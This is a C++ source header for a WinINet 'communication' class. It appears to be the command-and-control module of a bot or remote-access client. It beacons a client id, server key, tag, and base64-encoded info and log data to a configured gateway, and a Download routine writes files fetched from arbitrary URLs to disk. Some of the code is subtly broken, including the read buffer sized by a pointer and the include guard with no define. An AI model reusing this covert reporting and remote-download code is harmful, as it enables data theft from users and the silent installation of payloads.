#include "Includes.h"

#ifndef COMMUNICATION_H

class communication {
private:
	void UrlToComponents(std::string Url, std::string &Address, std::string &Options) {
		Url = Url.substr(Url.find("//") + 2, Url.length() - Url.find("//") - 2);
		Address = Url.substr(0, Url.find('/'));
		Options = Url.substr(Url.find('/'), Url.length() - Url.find('/'));
	}
public:
	std::string Address;
	std::string Gateway;
	std::string Agent;

	std::string Request(std::string Options) {
		char szData[1024];
		HINTERNET hSession, hConnect, hRequest;
		if (hSession = InternetOpenA(Agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) {
			if (hConnect = InternetConnectA(hSession, Address.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0)) {
				if (hRequest = HttpOpenRequestA(hConnect, "GET", std::string(Gateway + Options).c_str(), NULL, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 1)) {
					if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
						DWORD dwBytes;
						InternetReadFile(hRequest, &szData, sizeof(szData) - 1, &dwBytes);
						szData[dwBytes] = 0;
					}
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hSession);
		return std::string(szData);
	}

	bool Download(std::string Address, std::string Path) {
		std::string sAddress, sParam;
		UrlToComponents(Address, sAddress, sParam);
		
		char* cBuffer = new char[1024];
		bool Download = false;
		HINTERNET hSession, hConnect, hRequest;
		if (hSession = InternetOpenA(Agent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) {
			if (hConnect = InternetConnectA(hSession, sAddress.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0)) {
				if (hRequest = HttpOpenRequestA(hConnect, "GET", sParam.c_str(), NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0)) {
					if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
						std::ifstream fin;
						std::ofstream fout;
						fout.open(Path.c_str(), std::ios::out | std::ios::binary);
						
						if (fout.is_open()) {
							DWORD dwSize = 0;
							do {
								InternetReadFile(hRequest, cBuffer, sizeof(cBuffer), &dwSize);
								fout.write(cBuffer, dwSize);
							} while (dwSize != 0);
							Download = true;
						}
						fout.close();
						delete[] cBuffer;
					}
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hSession);
		return Download;
	}

	std::string Encode(std::string string) {

		std::string base64_chars =
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz"
			"0123456789+/";

		const char* chString = string.c_str();

		unsigned int i = 0;
		unsigned int j = 0;
		unsigned int string_len = strlen(chString);

		unsigned char char_array_3[3];
		unsigned char char_array_4[4];

		std::string Result;
		while (string_len--) {
			char_array_3[i++] = *(chString++);
			if (i == 3) {
				char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
				char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
				char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
				char_array_4[3] = char_array_3[2] & 0x3f;
				for (i = 0; (i < 4); i++)
					Result += base64_chars[char_array_4[i]];
				i = 0;
			}
		}

		if (i) {
			for (j = i; j < 3; j++)
				char_array_3[j] = '\0';

			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (j = 0; (j < i + 1); j++)
				Result += base64_chars[char_array_4[j]];

			while ((i++ < 3))
				Result += '=';
		}

		return Result;
	}

	void SendInfo(std::string info, std::string uId) {
		Request(std::string("?id=") + Encode(uId) +
			std::string("&key=") + Encode(SERVER_KEY) +
			std::string("&tag=") + Encode(CLIENT_TAG) +
			std::string("&info=") + Encode(info) +
			std::string("&marker=") + Encode("Info")
		);
	}

	void SendLog(std::string info, std::string uId) {
		Request(std::string("?id=") + Encode(uId) +
			std::string("&key=") + Encode(SERVER_KEY) +
			std::string("&tag=") + Encode(CLIENT_TAG) +
			std::string("&info=") + Encode(info) +
			std::string("&marker=") + Encode("Log")
		);
	}
};

communication Communication;

#endif